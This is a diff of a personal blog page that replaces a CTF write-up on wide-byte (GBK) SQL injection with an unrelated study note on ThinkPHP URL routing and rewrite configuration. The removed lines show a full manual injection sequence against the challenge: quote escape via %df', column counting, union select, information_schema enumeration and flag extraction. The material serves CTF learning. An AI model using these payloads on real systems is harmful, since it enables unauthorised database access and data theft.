@@ -15,32 +15,24 @@
 
 
 
-<meta name="description" content="今天做了ISCC2018的CTF，里面有一道宽字节注入的题，讲一下解题思路。">
-<meta name="keywords" content="CTF-WriteUp">
+<meta name="description" content="前言 这一部分学习PHP开发框架ThinkPHP的路由部分">
+<meta name="keywords" content="学习笔记">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ISCC-2018 web题&quot;SQL注入的艺术&quot; write up">
-<meta property="og:url" content="http://yoursite.com/2018/05/01/ISCC-2018-web6/index.html">
+<meta property="og:title" content="ThinkPHP框架学习--路由">
+<meta property="og:url" content="http://yoursite.com/2018/07/28/ThinkPHP2/index.html">
 <meta property="og:site_name" content="Double--R blog">
-<meta property="og:description" content="今天做了ISCC2018的CTF，里面有一道宽字节注入的题，讲一下解题思路。">
+<meta property="og:description" content="前言 这一部分学习PHP开发框架ThinkPHP的路由部分">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/18.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/1.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/2.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/3.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/4.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/5.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/6.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/7.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/8.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/9.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/10.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/11.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/12.jpg">
-<meta property="og:updated_time" content="2018-07-23T01:37:21.042Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/5.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/ThinkPHP/6.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/ThinkPHP/7.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/ThinkPHP/8.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/ThinkPHP/9.jpg">
+<meta property="og:updated_time" content="2018-07-29T02:33:00.654Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ISCC-2018 web题&quot;SQL注入的艺术&quot; write up">
-<meta name="twitter:description" content="今天做了ISCC2018的CTF，里面有一道宽字节注入的题，讲一下解题思路。">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/18.jpg">
+<meta name="twitter:title" content="ThinkPHP框架学习--路由">
+<meta name="twitter:description" content="前言 这一部分学习PHP开发框架ThinkPHP的路由部分">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/5.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -72,7 +64,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>ISCC-2018 web题&#34;SQL注入的艺术&#34; write up | Double--R blog</title>
+<title>ThinkPHP框架学习--路由 | Double--R blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -298,11 +290,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-ISCC-2018-web6" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ThinkPHP2" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/05/01/ISCC-2018-web6/" class="article-date">
-      <time datetime="2018-05-01T11:33:08.000Z" itemprop="datePublished">2018-05-01</time>
+      <a href="/2018/07/28/ThinkPHP2/" class="article-date">
+      <time datetime="2018-07-28T06:22:03.000Z" itemprop="datePublished">2018-07-28</time>
 </a>
 
 
@@ -317,7 +309,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      ISCC-2018 web题&#34;SQL注入的艺术&#34; write up
+      ThinkPHP框架学习--路由
     </h1>
   
 
@@ -326,7 +318,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-keyboard-o"></i>
 			<span class="post-meta-item-text"> 字数统计: </span>
-			<span class="post-count">715字</span>
+			<span class="post-count">755字</span>
 		</span>
 	</span>
 	
@@ -348,7 +340,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-WriteUp/">CTF-WriteUp</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/学习笔记/">学习笔记</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -358,63 +350,46 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><strong>今天做了ISCC2018的CTF，里面有一道宽字节注入的题，讲一下解题思路。</strong></p>
+        <p><strong>前言</strong></p>
+<p>这一部分学习PHP开发框架ThinkPHP的路由部分</p>
 <hr>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/18.jpg" alt="Alt text"></p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/5.jpg" alt="Alt text"></p>
 <a id="more"></a>
-<h4 id="第一步：看题"><a href="#第一步：看题" class="headerlink" title="第一步：看题"></a>第一步：看题</h4><ul>
-<li>进去以后有两个界面，一个首页，一个个人信息界面：</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/1.jpg" alt="Alt text"></p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/2.jpg" alt="Alt text"></p>
-<ul>
-<li>在个人信息界面看到?id=1，疑似注入点，单引号闭合一下，没有成功，单引号疑似被转义。极大可能是宽字节注入。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/3.jpg" alt="Alt text"></p>
-<h4 id="讲一下宽字节注入"><a href="#讲一下宽字节注入" class="headerlink" title="讲一下宽字节注入"></a>讲一下宽字节注入</h4><ul>
-<li><p><a href="https://www.cnblogs.com/lcamry/articles/5625276.html" target="_blank" rel="noopener">sql宽字节注入详解</a></p>
-<p>   gbk编码中汉字占两个字节，mysql在使用gbk编码时会认为两个字符是一个汉字（前一个的ascii码值要大于128，才到汉字范围）。当单引号被转义后’就变成了\’,如果我们把单引号改成%df’，转义后就是%df\’,\的ascii码值是5c，gbk编码认为%df%5c是一个汉字，所以单引号逃出转义，我们就能闭合查询语句。注意：虽然gb2312也是宽字节中的一员，但gb2312编码的取值范围高位为0xA1~0xF7，低位为0xA~0xFE,\号不再范围中，所以无法被编码。</p>
-</li>
-</ul>
-<h4 id="尝试宽字节注入"><a href="#尝试宽字节注入" class="headerlink" title="尝试宽字节注入"></a>尝试宽字节注入</h4><ul>
-<li>构造payload：1 %df’ and 1=1 %23 和 1 %df’ and 1=2 %23看能否宽字节注入。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/4.jpg" alt="Alt text"></p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/5.jpg" alt="Alt text"></p>
-<ul>
-<li>1=1逻辑成立，查询成功，有显示内容。1=2逻辑不成立，查询失败，无显示内容。成功将语句插入到查询语句中，宽字节注入可行。</li>
-</ul>
-<h4 id="Order-by-子句猜查询字段数"><a href="#Order-by-子句猜查询字段数" class="headerlink" title="Order by 子句猜查询字段数"></a>Order by 子句猜查询字段数</h4><ul>
-<li>构造payload：1 %df’ order by n %23. n从1开始逐渐变大，当n为8时能正常显示，n为9时无显示。说明查询语句查询了8个字段。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/6.jpg" alt="Alt text"></p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/7.jpg" alt="Alt text"></p>
-<h4 id="判断查询结果输出的位置"><a href="#判断查询结果输出的位置" class="headerlink" title="判断查询结果输出的位置"></a>判断查询结果输出的位置</h4><ul>
-<li>构造payload：-1 %df’ union select 1,2,3,4,5,6,7,8 %23. 2、7、4位的信息输出。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/8.jpg" alt="ALt text"></p>
-<h4 id="开始获得数据库信息"><a href="#开始获得数据库信息" class="headerlink" title="开始获得数据库信息"></a>开始获得数据库信息</h4><ul>
-<li>构造payload：-1 %df’ union select 1,database(),3,version(),5,6,7,8 %23 查询当前使用数据库名和版本信息。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/9.jpg" alt="ALt text"></p>
-<ul>
-<li>数据库名baji，构造payload：-1 %df’ union select 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema=0x62616A69 %23，查表名（0x62616A69为数据库名的ascii码值)</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/10.jpg" alt="Alt text"></p>
-<ul>
-<li>只有一个admins表，构造payload：-1 %df’ union select 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_schema=0x62616A69 %23，查字段名。注：按理来说如果不止一张表要确定具体查询的表，完整的是 where table_schema=baji and table_name=admins，但是它只有一个表，我懒得编码表名了。</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/11.jpg" alt="Alt text"></p>
-<ul>
-<li>有个flag的字段名，查一下这个字段下的信息，构造payload：-1 %df’ union select 1,group_concat(flag),3,4,5,6,7,8 from baji.admins %23</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/ISCC/12.jpg" alt="Alt text"></p>
-<ul>
-<li>出flag,提交成功，题目解出。</li>
-</ul>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>题目与一些盲注比起来还是比较简单的，没有什么过滤，也不用写注入脚本，手注就行了。做下来没有什么地方卡住的。还是要继续努力，下次做出一些难题来。</strong></p>
 <hr>
-<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=487190408&auto=1&height=66"></iframe></div>
+<h2 id="URL的三种模式"><a href="#URL的三种模式" class="headerlink" title="URL的三种模式"></a>URL的三种模式</h2><p><strong>动态URL：</strong>也指动态页面。优点：有很强的交互性；缺点：安全隐患大，每次访问都需要经过服务器的编译执行，对服务器有一定的负载压力</p>
+<p><strong>静态URL：</strong>也指静态页面。优点：不做任何编译操作，访问速度快、跨平台、跨服务器；缺点：文件直接村房子啊服务器磁盘上，服务器磁盘空间会占用过多</p>
+<p><strong>伪静态URL：</strong>本质还是动态页面。优点：解决了前两者的问题；缺点：到底发送什么内容由Web服务器来判定，访问量大时容易导致网站崩溃</p>
+<h2 id="ThinkPHP的路由"><a href="#ThinkPHP的路由" class="headerlink" title="ThinkPHP的路由"></a>ThinkPHP的路由</h2><h3 id="路由模式"><a href="#路由模式" class="headerlink" title="路由模式"></a>路由模式</h3><p>ThinkPHP支持一下四种模式：</p>
+<ul>
+<li>普通模式</li>
+<li>pathinfo模式</li>
+<li>rewrite模式</li>
+<li>兼容模式</li>
+</ul>
+<p>普通模式和兼容模式归类到动态URL，pathinfo模式和rewrite模式归类到伪静态模式。想要以rewrite模式访问页面需要写重定向规则。</p>
+<p>创建文件.htaccesss（Apache服务器的分布式配置文件）</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/ThinkPHP/6.jpg" alt=""></p>
+<p>文件内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine on                     //打开重写引擎</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !-d  //</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !-f  //如果请求文件不是目录而且不是文件</span><br><span class="line">RewriteRule ^(.*)$ index.php/$1 [L]  //重定向到index.php,L便hi是如果该规则处理成功就不继续下一条规则</span><br></pre></td></tr></table></figure>
+<p>访问结果：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/ThinkPHP/7.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/ThinkPHP/8.jpg" alt=""></p>
+<h3 id="路由配置"><a href="#路由配置" class="headerlink" title="路由配置"></a>路由配置</h3><p>要使用ThinkPHP的路由功能，只要Web服务器支持除普通模式外的任何一种模式即可，前提是在公共（或模块）配置文件中启动路由功能。</p>
+<p>Application/Common/Conf/config.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">	<span class="comment">//'配置项'=&gt;'配置值'</span></span><br><span class="line">	<span class="string">'URL_ROUTER_ON'</span> =&gt; <span class="keyword">true</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>接下来就是配置路由规则，在Application/Home/Conf/config.php中配置 URL_ROUTE_RULES参数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">	<span class="comment">//'配置项'=&gt;'配置值'</span></span><br><span class="line">	<span class="string">'URL_ROUTE_RULES'</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'posts/:year/:month/:day'</span> =&gt; <span class="string">'Index/index'</span></span><br><span class="line">		)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>编辑主控制器文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"year:"</span>.$_GET[<span class="string">'year'</span>].<span class="string">", month:"</span>.$_GET[<span class="string">'month'</span>].<span class="string">",  day:"</span>.$_GET[<span class="string">'day'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/ThinkPHP/9.jpg" alt=""></p>
+<p>路由定义的一般规则：“路由表达式” =&gt; “路由地址和参数” 或者array(“路由表达式”，“路由地址”，“传出参数”)。</p>
+<p>路由表达式是指以何种规则匹配浏览器中的地址，如果匹配成功，系统将在处理请求的同时把传入参数传给指定的动作。ThinkPHP的路由规则采取顺序遍历方式进行，只要成功匹配一条匹配的路由，则终止继续匹配</p>
+<h2 id="路由表达式"><a href="#路由表达式" class="headerlink" title="路由表达式"></a>路由表达式</h2><p><strong>规则路由：</strong>通过“:”进行参数匹配，如果匹配陈工，则将该位置的参数传给指定动作</p>
+<p><strong>正则路由：</strong>通过正则匹配进行路由表达式的配置</p>
+<p><strong>静态路由：</strong>静态路由定义中不含任何动作参数，也不需要遍历路由规则。为了区分前两种路由，静态路由采用URL_MAP_RULES进行定义。</p>
+<hr>
+<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=468546961&auto=1&height=66"></iframe></div>
       
     </div>
     
@@ -422,13 +397,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/05/01/ISCC-2018-web6/">ISCC-2018 web题&#34;SQL注入的艺术&#34; write up</a></p>
+        <p><span>本文标题:</span><a href="/2018/07/28/ThinkPHP2/">ThinkPHP框架学习--路由</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Double--R</a></p>
-        <p><span>发布时间:</span>2018-05-01, 19:33:08</p>
-        <p><span>最后更新:</span>2018-07-23, 09:37:21</p>
+        <p><span>发布时间:</span>2018-07-28, 14:22:03</p>
+        <p><span>最后更新:</span>2018-07-29, 10:33:00</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/05/01/ISCC-2018-web6/" title="ISCC-2018 web题&#34;SQL注入的艺术&#34; write up">http://yoursite.com/2018/05/01/ISCC-2018-web6/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/05/01/ISCC-2018-web6/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/07/28/ThinkPHP2/" title="ThinkPHP框架学习--路由">http://yoursite.com/2018/07/28/ThinkPHP2/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/07/28/ThinkPHP2/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -440,16 +415,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/05/11/PHP-Unseriablize/">
-                    php反序列化漏洞
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/04/27/BugKu-Login3/">
-                    BugKuCTF-Login3的Write Up
+                <a href="/2018/07/26/ThinkPHP1/">
+                    ThinkPHP框架学习--配置
                 </a>
             </div>
         
@@ -461,7 +430,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一步：看题"><span class="toc-number">1.</span> <span class="toc-text">第一步：看题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#讲一下宽字节注入"><span class="toc-number">2.</span> <span class="toc-text">讲一下宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#尝试宽字节注入"><span class="toc-number">3.</span> <span class="toc-text">尝试宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Order-by-子句猜查询字段数"><span class="toc-number">4.</span> <span class="toc-text">Order by 子句猜查询字段数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#判断查询结果输出的位置"><span class="toc-number">5.</span> <span class="toc-text">判断查询结果输出的位置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#开始获得数据库信息"><span class="toc-number">6.</span> <span class="toc-text">开始获得数据库信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#URL的三种模式"><span class="toc-number">1.</span> <span class="toc-text">URL的三种模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ThinkPHP的路由"><span class="toc-number">2.</span> <span class="toc-text">ThinkPHP的路由</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#路由模式"><span class="toc-number">2.1.</span> <span class="toc-text">路由模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#路由配置"><span class="toc-number">2.2.</span> <span class="toc-text">路由配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#路由表达式"><span class="toc-number">3.</span> <span class="toc-text">路由表达式</span></a></li></ol>
         
     </div>
     <style>
@@ -497,7 +466,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"ISCC-2018 web题"SQL注入的艺术" write up　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"ThinkPHP框架学习--路由　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -517,15 +486,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/05/11/PHP-Unseriablize/" title="上一篇: php反序列化漏洞">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/04/27/BugKu-Login3/" title="下一篇: BugKuCTF-Login3的Write Up">
+            <a href="/2018/07/26/ThinkPHP1/" title="下一篇: ThinkPHP框架学习--配置">
                 <i class="fa fa-angle-right"></i>
             </a>
         
